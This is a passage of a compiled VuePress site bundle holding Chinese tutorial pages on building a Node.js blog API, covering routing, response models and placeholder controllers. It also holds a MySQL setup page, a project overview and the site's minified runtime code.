=> {\n    const method = req.method;\n    const pathname = req.path.pathname\n    if (method === 'POST' && pathname === '/api/user/login') {\n        const { username, password } = req.body;\n        const result = loginCheck(username, password);\n        if (result) {\n            return new ResSuccModel(result, '登录成功');\n        }\n        return new ResErrModel(result, '登录失败');\n    }\n}\n\nmodule.exports = handleUserRouter;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 要处理好异步的postData\n\n因为我们使用的原始Node开发接口，这个POST请求的参数接收是req.on('data')和req.on('end')，它们是一个异步操作，需要使用Promise来包装它们。\n\n可以看到下面的代码演示，我们在getPostData函数里使用new Promise对req.on('data')和req.on('end')进行了包装，只有等这个Promise在resolve()后才能获取到postData并存储在req.body里了。这里要注意的是req.body = await getPostData(req)后面的代码，是在await这里的异步操作执行完之后才能执行的。\n\napp.js：\n\nconst { resolve } = require('path');\nconst { URL } = require('url');\nconst handleBlogRouter = require('./src/router/blog');\nconst handleUserRouter = require('./src/router/user');\n\nconst serverHandler = async (req, res) => {\n    // url信息\n    console.log('req.url', req.url)\n    console.log('req.headers.host', req.headers.host)\n    // 处理url，其实也是处理get请求参数\n    req.path = new URL(req.url, `http://${req.headers.host}`);\n    console.log('req.path', req.path)\n    // 处理post请求参数\n    req.body = await getPostData(req);\n    // 设置响应信息\n    res.setHeader('Content-Type', 'application/json');\n    res.statusCode = 200;\n    const blogData = handleBlogRouter(req, res);\n    if (blogData) {\n        res.end(JSON.stringify(blogData))\n        return;\n    }\n    const userData = handleUserRouter(req, res);\n    if (userData) {\n        res.end(JSON.stringify(userData))\n        return;\n    }\n    res.writeHead(404, { \"Content-Type\": 'text/plain' });\n    res.write(\"404 Not Found\");\n    res.end();\n}\nconst getPostData = (req) => {\n    return new Promise((resolve, reject) => {\n        if (req.method !== 'POST' || req.headers['content-type'] !== 'application/json') {\n            resolve({});\n            return; // 不return的话，可能会遇到既resolve({})也resolve(JSON.parse(postData))\n        }\n        let postData = '';\n        req.on('data', chunk => {\n            postData += chunk.toString();\n        });\n        req.on('end', () => {\n            if (!postData) resolve({});\n            else resolve(JSON.parse(postData))\n        });\n    });\n}\nmodule.exports = serverHandler;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n",normalizedContent:"# 开发接口\n\n\n# 原始node开发接口\n\n\n# 初始化路由\n\n在项目根目录下新建src目录，在该目录下新建router文件夹。然后在router文件夹新建user.js和blog.js，这两个文件就是两个不同的功能模块，用于处理各自的路由。\n\nconst { url } = require('url');\nconst handleblogrouter = require('./src/router/blog');\nconst handleuserrouter = require('./src/router/user');\n\nconst serverhandler = (req, res) => {\n    // url信息\n    console.log('req.url', req.url)\n    console.log('req.headers.host', req.headers.host)\n    req.path = new url(req.url, `http://${req.headers.host}`);\n    res.setheader('content-type', 'application/json');\n    res.statuscode = 200;\n    const blogdata = handleblogrouter(req, res);\n    if (blogdata) {\n        res.end(json.stringify(blogdata))\n        return;\n    }\n    const userdata = handleuserrouter(req, res);\n    if (userdata) {\n        res.end(json.stringify(userdata))\n        return;\n    }\n    // 没有请求到正确的路由\n    res.writehead(404, { \"content-type\": 'text/plain' });\n    res.write(\"404 not found\");\n    res.end();\n}\nmodule.exports = serverhandler;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\nconst handleuserrouter = (req, res) => {\n    const method = req.method;\n    const pathname = req.path.pathname\n    console.log('method', method)\n    console.log('pathname', pathname)\n    if (method === 'post' && pathname === '/api/user/login') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n}\n\nmodule.exports = handleuserrouter;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nconst handleblogrouter = (req, res) => {\n    const method = req.method;\n    const pathname = req.path.pathname\n    console.log('method', method)\n    console.log('pathname', pathname)\n    if (method === 'get' && pathname === '/api/blog/list') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n    if (method === 'get' && pathname === '/api/blog/detail') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n    if (method === 'post' && pathname === '/api/blog/new') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n    if (method === 'post' && pathname === '/api/blog/update') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n    if (method === 'post' && pathname === '/api/blog/del') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n}\n\nmodule.exports = handleblogrouter;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 分层-数据模型\n\n上一节还未进行分层处理，我们需要对处理响应的逻辑进行分层，分为：数据模型、路由、数据处理。\n\n在src下新建文件夹model，它是用来存放数据模型，我们现在所需的数据模型暂时是：成功ressuccmodel和处理失败reserrmodel。\n\n/src/model/resmodel.js\n\n/**\n * 数据模型基类\n */\nclass basemodel {\n    constructor(data, message) {\n        this.data = data;\n        if (typeof data === 'string') {\n            this.message = data;\n        } else if (message) {\n            this.message = message;\n        }\n    }\n}\n/**\n * 成功后响应的数据模型\n */\nclass ressuccmodel extends basemodel {\n    constructor(data, message) {\n        super(data, message);\n        this.errno = 0;\n    }\n}\n/**\n * 失败后响应的数据模型\n */\nclass reserrmodel extends basemodel {\n    constructor(data, message) {\n        super(data, message);\n        this.errno = -1;\n    }\n}\nmodule.exports = {\n    ressuccmodel,\n    reserrmodel\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 分层-数据处理\n\n我们将数据处理这一部分逻辑单独抽离出来，不要与路由处理逻辑混在一起了。\n\n在src下新建文件夹controller，用于存放某些路由对应的数据处理的js。\n\nconst getbloglist = (author, keyword) => {\n    // 暂时返回假数据\n    return [\n        {\n            id: '001',\n            title: '标题1',\n            content: '内容1',\n            createtime: 1635150746077,\n            author: '作者1'\n        },\n        {\n            id: '002',\n            title: '标题2',\n            content: '内容2',\n            createtime: 1635150765864,\n            author: '作者2'\n        }\n    ];\n}\nconst getblogdetail = (id) => {\n    // 暂时返回假数据\n    return {\n        id: '001',\n        title: '标题1',\n        content: '内容1',\n        createtime: 1635150746077,\n        author: '作者1'\n    }\n}\nconst newblog = (blogdata = {}) => {\n    // 返回新建博客的id，表示成功\n    return { id: '003' }\n}\nconst updateblog = (blogdata = {}) => {\n    // 更新成功\n    return true;\n}\nconst deleteblog = (blogid) => {\n    // 删除成功\n    return true;\n}\nmodule.exports = {\n    getbloglist,\n    getblogdetail,\n    newblog,\n    updateblog,\n    deleteblog\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\nconst logincheck = (username, password) => {\n    if (username === 'admin' && password === 'admin') {\n        return true\n    }\n    return false;\n}\nmodule.exports = {\n    logincheck\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n我们还没有连接数据库，所以接口返回暂时都用的假数据。\n\n\n# 分层-路由\n\n因为分层了，路由这一层需要将数据模型和数据处理这两层的内容引进来。\n\nconst { getbloglist, getblogdetail, newblog, updateblog, deleteblog } = require('../controller/blog');\nconst { ressuccmodel, reserrmodel } = require('../model/resmodel');\n\nconst handleblogrouter = (req, res) => {\n    const method = req.method;\n    const pathname = req.path.pathname\n    if (method === 'get' && pathname === '/api/blog/list') {\n        const author = req.path.searchparams.get('author');\n        const keyword = req.path.searchparams.get('keyword');\n        const listdata = getbloglist(author, keyword);\n        return new ressuccmodel(listdata);\n    }\n    if (method === 'get' && pathname === '/api/blog/detail') {\n        const id = req.path.searchparams.get('id');\n        const data = getblogdetail(id);\n        return new ressuccmodel(data);\n    }\n    if (method === 'post' && pathname === '/api/blog/new') {\n        const blogdata = req.body;\n        return new ressuccmodel(newblog(blogdata));\n    }\n    if (method === 'post' && pathname === '/api/blog/update') {\n        const blogdata = req.body;\n        const result = updateblog(blogdata);\n        if (result) {\n            return new ressuccmodel(result, '更新成功');\n        } else {\n            return new reserrmodel(result, '更新失败');\n        }\n    }\n    if (method === 'post' && pathname === '/api/blog/del') {\n        const blogid = req.body.id;\n        const result = deleteblog(blogid);\n        if (result) {\n            return new ressuccmodel(result, '删除成功');\n        } else {\n            return new reserrmodel(result, '删除失败');\n        }\n    }\n}\n\nmodule.exports = handleblogrouter;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nconst { logincheck } = require(\"../controller/user\");\nconst { ressuccmodel, reserrmodel } = require('../model/resmodel');\n\nconst handleuserrouter = (req, res) => {\n    const method = req.method;\n    const pathname = req.path.pathname\n    if (method === 'post' && pathname === '/api/user/login') {\n        const { username, password } = req.body;\n        const result = logincheck(username, password);\n        if (result) {\n            return new ressuccmodel(result, '登录成功');\n        }\n        return new reserrmodel(result, '登录失败');\n    }\n}\n\nmodule.exports = handleuserrouter;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 要处理好异步的postdata\n\n因为我们使用的原始node开发接口，这个post请求的参数接收是req.on('data')和req.on('end')，它们是一个异步操作，需要使用promise来包装它们。\n\n可以看到下面的代码演示，我们在getpostdata函数里使用new promise对req.on('data')和req.on('end')进行了包装，只有等这个promise在resolve()后才能获取到postdata并存储在req.body里了。这里要注意的是req.body = await getpostdata(req)后面的代码，是在await这里的异步操作执行完之后才能执行的。\n\napp.js：\n\nconst { resolve } = require('path');\nconst { url } = require('url');\nconst handleblogrouter = require('./src/router/blog');\nconst handleuserrouter = require('./src/router/user');\n\nconst serverhandler = async (req, res) => {\n    // url信息\n    console.log('req.url', req.url)\n    console.log('req.headers.host', req.headers.host)\n    // 处理url，其实也是处理get请求参数\n    req.path = new url(req.url, `http://${req.headers.host}`);\n    console.log('req.path', req.path)\n    // 处理post请求参数\n    req.body = await getpostdata(req);\n    // 设置响应信息\n    res.setheader('content-type', 'application/json');\n    res.statuscode = 200;\n    const blogdata = handleblogrouter(req, res);\n    if (blogdata) {\n        res.end(json.stringify(blogdata))\n        return;\n    }\n    const userdata = handleuserrouter(req, res);\n    if (userdata) {\n        res.end(json.stringify(userdata))\n        return;\n    }\n    res.writehead(404, { \"content-type\": 'text/plain' });\n    res.write(\"404 not found\");\n    res.end();\n}\nconst getpostdata = (req) => {\n    return new promise((resolve, reject) => {\n        if (req.method !== 'post' || req.headers['content-type'] !== 'application/json') {\n            resolve({});\n            return; // 不return的话，可能会遇到既resolve({})也resolve(json.parse(postdata))\n        }\n        let postdata = '';\n        req.on('data', chunk => {\n            postdata += chunk.tostring();\n        });\n        req.on('end', () => {\n            if (!postdata) resolve({});\n            else resolve(json.parse(postdata))\n        });\n    });\n}\nmodule.exports = serverhandler;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n",charsets:{cjk:!0}},{title:"使用数据库",frontmatter:{},regularPath:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/3.%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93.html",relativePath:"book-web/项目/用vue+node开发博客项目/3.使用数据库.md",key:"v-59315497",path:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/3.%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93.html",headers:[{level:2,title:"数据库准备",slug:"数据库准备",normalizedTitle:"数据库准备",charIndex:12},{level:2,title:"建表工作",slug:"建表工作",normalizedTitle:"建表工作",charIndex:257}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"数据库准备 建表工作",content:"# 使用数据库\n\n\n# 数据库准备\n\n数据库我们选择MySql，MySql的使用人群广，遇到问题比较方便解决。\n\n数据库客户端（图形化界面）使用的是Navicat，Navicat的使用人群也很广，界面比较友好。\n\n我们没有使用本地的MySql，也就说我们本地并没有安装MySql，我们使用的是阿里云云数据库MySql版。原因是我们迟早会使用线上的数据库，站库分离也比较好维护，也减轻了本地计算机的压力。\n\n阿里云mysql数据库的购买以及怎么使用Navicat连接它，可以看学习mysql的准备工作这篇。\n\n\n# 建表工作\n\n建表之前要建库建专用用户，具体可以看建库建表操作表。",normalizedContent:"# 使用数据库\n\n\n# 数据库准备\n\n数据库我们选择mysql，mysql的使用人群广，遇到问题比较方便解决。\n\n数据库客户端（图形化界面）使用的是navicat，navicat的使用人群也很广，界面比较友好。\n\n我们没有使用本地的mysql，也就说我们本地并没有安装mysql，我们使用的是阿里云云数据库mysql版。原因是我们迟早会使用线上的数据库，站库分离也比较好维护，也减轻了本地计算机的压力。\n\n阿里云mysql数据库的购买以及怎么使用navicat连接它，可以看学习mysql的准备工作这篇。\n\n\n# 建表工作\n\n建表之前要建库建专用用户，具体可以看建库建表操作表。",charsets:{cjk:!0}},{title:"项目简介",frontmatter:{},regularPath:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/",relativePath:"book-web/项目/用vue+node开发博客项目/README.md",key:"v-ecfff446",path:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/",headers:[{level:2,title:"目标",slug:"目标",normalizedTitle:"目标",charIndex:11},{level:2,title:"需求",slug:"需求",normalizedTitle:"需求",charIndex:159},{level:2,title:"技术方案",slug:"技术方案",normalizedTitle:"技术方案",charIndex:334}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"目标 需求 技术方案",content:"# 项目简介\n\n\n# 目标\n\n我们之前使用的静态博客（服务端渲染），用Docsify+Gitee进行搭建，它并不具备一些增删改查的功能。并且它是单用户的静态博客。\n\n我们现在会开发一个博客系统，具有博客的基本功能（增删改查）。它具有前端和服务端，其实是分离的两个项目。开发的博客系统是一个多用户动态博客系统。\n\n\n# 需求\n\n 1. 首页：进入博客系统的第一个页面，是比较重要的一个页面，呈现了博客整体的内容。\n 2. 作者主页：系统中某个用户的主页，展示该用户的博客列表等。\n 3. 博客详情页：博客标题、博客正文等。\n 4. 登录页：用户登录的地方。\n 5. 管理中心：用户管理博客的地方。\n 6. 新建页：新建一篇博客。\n 7. 编辑页：编辑一篇博客。\n\n\n# 技术方案\n\n * 前端技术方案：\n   \n   * UI框架：使用Vue，暂时使用2.6的版本。\n\n * 服务端技术方案：\n   \n   * 数据存储：需要存储博客和用户，使用MySql进行数据存储\n   * 与前端对接、接口设计：",normalizedContent:"# 项目简介\n\n\n# 目标\n\n我们之前使用的静态博客（服务端渲染），用docsify+gitee进行搭建，它并不具备一些增删改查的功能。并且它是单用户的静态博客。\n\n我们现在会开发一个博客系统，具有博客的基本功能（增删改查）。它具有前端和服务端，其实是分离的两个项目。开发的博客系统是一个多用户动态博客系统。\n\n\n# 需求\n\n 1. 首页：进入博客系统的第一个页面，是比较重要的一个页面，呈现了博客整体的内容。\n 2. 作者主页：系统中某个用户的主页，展示该用户的博客列表等。\n 3. 博客详情页：博客标题、博客正文等。\n 4. 登录页：用户登录的地方。\n 5. 管理中心：用户管理博客的地方。\n 6. 新建页：新建一篇博客。\n 7. 编辑页：编辑一篇博客。\n\n\n# 技术方案\n\n * 前端技术方案：\n   \n   * ui框架：使用vue，暂时使用2.6的版本。\n\n * 服务端技术方案：\n   \n   * 数据存储：需要存储博客和用户，使用mysql进行数据存储\n   * 与前端对接、接口设计：",charsets:{cjk:!0}}],themeConfig:{sidebarDepth:0,lastUpdated:!0,displayAllHeaders:!1,activeHeaderLinks:!1,smoothScroll:!0,sidebar:{"/book-web/":[{title:"web前端",collapsable:!1,initialOpenGroupIndex:-1,children:[{title:"学习JavaScript",path:"/book-web/html、css、js、ts/学习JavaScript/",collapsable:!0,children:["/book-web/html、css、js、ts/学习JavaScript/1.基础语法","/book-web/html、css、js、ts/学习JavaScript/2.变量、作用域和内存问题","/book-web/html、css、js、ts/学习JavaScript/3.引用类型","/book-web/html、css、js、ts/学习JavaScript/4.面向对象程序设计","/book-web/html、css、js、ts/学习JavaScript/5.函数表达式","/book-web/html、css、js、ts/学习JavaScript/6.Http、Ajax和跨域","/book-web/html、css、js、ts/学习JavaScript/7.异步编程","/book-web/html、css、js、ts/学习JavaScript/js零碎知识和案例"]},{title:"学习CSS",collapsable:!0,path:"/book-web/html、css、js、ts/学习CSS/",children:["/book-web/html、css、js、ts/学习CSS/1.选择器","/book-web/html、css、js、ts/学习CSS/2.盒模型","/book-web/html、css、js、ts/学习CSS/3.字体与文本属性","/book-web/html、css、js、ts/学习CSS/4.变换、过渡、动画","/book-web/html、css、js、ts/学习CSS/5.定位与浮动","/book-web/html、css、js、ts/学习CSS/6.表格与居中布局","/book-web/html、css、js、ts/学习CSS/7.多列布局","/book-web/html、css、js、ts/学习CSS/8.弹性盒布局","/book-web/html、css、js、ts/学习CSS/9.网格布局","/book-web/html、css、js、ts/学习CSS/10.媒体查询","/book-web/html、css、js、ts/学习CSS/11.还原UI设计"]},{title:"学习TypeScript",collapsable:!0,path:"/book-web/html、css、js、ts/学习TypeScript/",children:["/book-web/html、css、js、ts/学习TypeScript/1.typescript基础","/book-web/html、css、js、ts/学习TypeScript/2.typescript进阶"]},{title:"学习Vue",collapsable:!0,path:"/book-web/web前端js框架/学习Vue/",children:["/book-web/web前端js框架/学习Vue/1.vue基础","/book-web/web前端js框架/学习Vue/2.vue进阶","/book-web/web前端js框架/学习Vue/3.vue周边","/book-web/web前端js框架/学习Vue/4.vue3学习","/book-web/web前端js框架/学习Vue/5.vue散记"]},{title:"学习React",collapsable:!0,path:"/book-web/web前端js框架/学习React/",children:["/book-web/web前端js框架/学习React/1.react基础","/book-web/web前端js框架/学习React/2.react进阶","/book-web/web前端js框架/学习React/react相关问题"]},"/book-web/web前端js框架/学习jQuery",{title:"H5游戏引擎Laya",collapsable:!0,path:"/book-web/LayaBox游戏引擎/",children:["/book-web/LayaBox游戏引擎/1.环境搭建","/book-web/LayaBox游戏引擎/2.IDE的使用","/book-web/LayaBox游戏引擎/3.组件库的介绍","/book-web/LayaBox游戏引擎/4.常用组件详解","/book-web/LayaBox游戏引擎/5.组件化开发","/book-web/LayaBox游戏引擎/6.屏幕适配与抗锯齿","/book-web/LayaBox游戏引擎/7.性能优化"]}]},{title:"数据结构与算法",collapsable:!1,initialOpenGroupIndex:-1,children:[{title:"数据结构与算法ts版",collapsable:!0,path:"/book-web/数据结构与算法/",children:["/book-web/数据结构与算法/1.环境搭建","/book-web/数据结构与算法/2.栈","/book-web/数据结构与算法/3.队列","/book-web/数据结构与算法/4.链表","/book-web/数据结构与算法/5.集合","/book-web/数据结构与算法/6.字典和散列表","/book-web/数据结构与算法/7.递归","/book-web/数据结构与算法/8.树","/book-web/数据结构与算法/9.二叉堆和堆排序","/book-web/数据结构与算法/10.图","/book-web/数据结构与算法/11.排序和搜索算法","/book-web/数据结构与算法/12.算法设计与技巧","/book-web/数据结构与算法/13.算法复杂度"]}]},{title:"常用工具",collapsable:!1,children:["/book-web/常用工具/Npm的使用","/book-web/常用工具/Git的使用","/book-web/常用工具/webpack的使用","/book-web/常用工具/VSCode的使用","/book-web/常用工具/Chrome的使用","/book-web/常用工具/使用docsify写blog","/book-web/常用工具/使用gitbook写blog","/book-web/web前端测试与调试/基于mocha+chai的单元测试"]},{title:"简单项目实践",collapsable:!1,initialOpenGroupIndex:-1,children:[{title:"react+express+ts写爬虫",collapsable:!0,path:"/book-web/项目/react+express+ts写爬虫/",children:["/book-web/项目/react+express+ts写爬虫/1.用ts编写小爬虫","/book-web/项目/react+express+ts写爬虫/2.用express实现爬虫接口","/book-web/项目/react+express+ts写爬虫/3.用react展示爬虫数据"]}]},{title:"面试准备",collapsable:!1,children:[]}],"/book-sketches/":[{title:"电脑工具",collapsable:!1,children:["/book-sketches/电脑工具/win10下载与安装","/book-sketches/电脑工具/谷歌浏览器使用","/book-sketches/电脑工具/Frp实现内网穿透","/book-sketches/电脑工具/SoftEther实现虚拟局域网"]},{title:"日常生活",collapsable:!1,children:["/book-sketches/日常生活/土味情话"]}]},expandAllGroup:!1,nav:[{text:"Web",link:"/book-web/"},{text:"生活",link:"/book-sketches/"}],rightSidebar:{mode:"dom",dept:6,scope:".page .content__default",navbarHeight:57.6}}};t(227);za.component("Badge",()=>Promise.all([t.e(0),t.e(35)]).then(t.bind(null,733))),za.component("CodeGroup",()=>Promise.all([t.e(0),t.e(37)]).then(t.bind(null,631))),za.component("CodeBlock",()=>Promise.all([t.e(0),t.e(36)]).then(t.bind(null,632)));t(228),t(229);function yi(n){const e=document.documentElement.getBoundingClientRect(),t=n.getBoundingClientRect();return{x:t.left-e.left,y:t.top-e.top}}var wi=[{},({Vue:n})=>{n.mixin({computed:{$dataBlock(){return this.$options.__data__block__}}})},{},{},({Vue:n,router:e})=>{e.options.scrollBehavior=(e,t,o)=>{if(o)return window.scrollTo({top:o.y,behavior:"smooth"});if(e.hash){if(n.$vuepress.$get("disableScrollBehavior"))return!1;const t=document.querySelector(e.hash);return!!t&&window.scrollTo({top:yi(t).y,behavior:"smooth"})}return window.scrollTo({top:0,behavior:"smooth"})}}],Ei=[];class ki extends class{constructor(){this.store=new za({data:{state:{}}})}$get(n){return this.store.state[n]}$set(n,e){za.set(this.store.state,n,e)}$emit(...n){this.store.$emit(...n)}$on(...n){this.store.$on(...n)}}{}Object.assign(ki.prototype,{getPageAsyncComponent:Os,getLayoutAsyncComponent:Ps,getAsyncComponent:Ms,getVueComponent:qs});var Ai={install(n){const e=new ki;n.$vuepress=e,n.prototype.$vuepress=e}};function ji(n,e){const t=e.toLowerCase();return n.options.routes.some(n=>n.path.toLowerCase()===t)}var Ti={props:{pageKey:String,slotKey:{type:String,default:"default"}},render(n){const e=this.pageKey||this.$parent.$page.key;return $s("pageKey",e),za.component(e)||za.component(e,Os(e)),za.component(e)?n(e):n("")}},Bi={functional:!0,props:{slotKey:String,required:!0},render:(n,{props:e,slots:t})=>n("div",{class:["content__"+e.slotKey]},t()[e.slotKey])},_i={computed:{openInNewWindowTitle(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},Si=(t(230),t(231),Object(bi.a)(_i,(function(){var n=this.$createElement,e=this._self._c||n;return e("span",[e("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[e("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),e("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),e("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports),Ci={functional:!0,render(n,{parent:e,children:t}){if(e._isMounted)return t;e.$once("hook:mounted",()=>{e.$forceUpdate()})}};za.config.productionTip=!1,za.use(ks),za.use(Ai),za.mixin(function(n,e,t=za){!function(n){n.locales&&Object.keys(n.locales).forEach(e=>{n.locales[e].path=e});Object.freeze(n)}(e),t.$vuepress.$set("siteData",e);const o=new(n(t.$vuepress.$get("siteData"))),a=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(o)),r={};return Object.keys(a).reduce((n,e)=>(e.startsWith("$")&&(n[e]=a[e].get),n),r),{computed:r}}(n=>class{setPage(n){this.__page=n}get $site(){return n}get $themeConfig(){return this.$site.themeConfig}get $frontmatter(){return this.$page.frontmatter}get $localeConfig(){const{locales:n={}}=this.$site;let e,t;for(const o in n)"/"===o?t=n[o]:0===this.$page.path.indexOf(o)&&(e=n[o]);return e||t||{}}get $siteTitle(){return this.$localeConfig.title||this.$site.title||""}get $canonicalUrl(){const{canonicalUrl:n}=this.$page.frontmatter;return"string"==typeof n&&n}get $title(){const n=this.$page,{metaTitle:e}=this.$page.frontmatter;if("string"==typeof e)return e;const t=this.$siteTitle,o=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?o?o+" | "+t:t:o||"VuePress"}get $description(){const n=function(n){if(n){const e=n.filter(n=>"description"===n.name)[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}get $lang(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}get $localePath(){return this.$localeConfig.path||"/"}get $themeLocaleConfig(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}get $page(){return this.__page?this.__page:function(n,e){for(let t=0;t<n.length;t++){const o=n[t];if(o.path.toLowerCase()===e.toLowerCase())return o}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}},xi)),za.component("Content",Ti),za.component("ContentSlotsDistributor",Bi),za.component("OutboundLink",Si),za.component("ClientOnly",Ci),za.component("Layout",Ps("Layout")),za.component("NotFound",Ps("NotFound")),za.prototype.$withBase=function(n){const e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.9.7",hash:"22316fb"},async function(n){const e="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:xi.routerBase||xi.base,t=new ks({base:e,mode:"history",fallback:!1,routes:fi,scrollBehavior:(n,e,t)=>t||(n.hash?!za.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})});!function(n){n.beforeEach((e,t,o)=>{if(ji(n,e.path))o();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){const t=e.path.replace(/\/$/,"")+".html";ji(n,t)?o(t):o()}else o();else{const t=e.path+"/",a=e.path+".html";ji(n,a)?o(a):ji(n,t)?o(t):o()}})}(t);const o={};try{await Promise.all(wi.filter(n=>"function"==typeof n).map(e=>e({Vue:za,options:o,router:t,siteData:xi,isServer:n})))}catch(n){console.error(n)}return{app:new za(Object.assign(o,{router:t,render:n=>n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},Ei.map(e=>n(e)))])})),router:t}}(!1).then(({app:n,router:e})=>{e.onReady(()=>{n.$mount("#app")})})}]);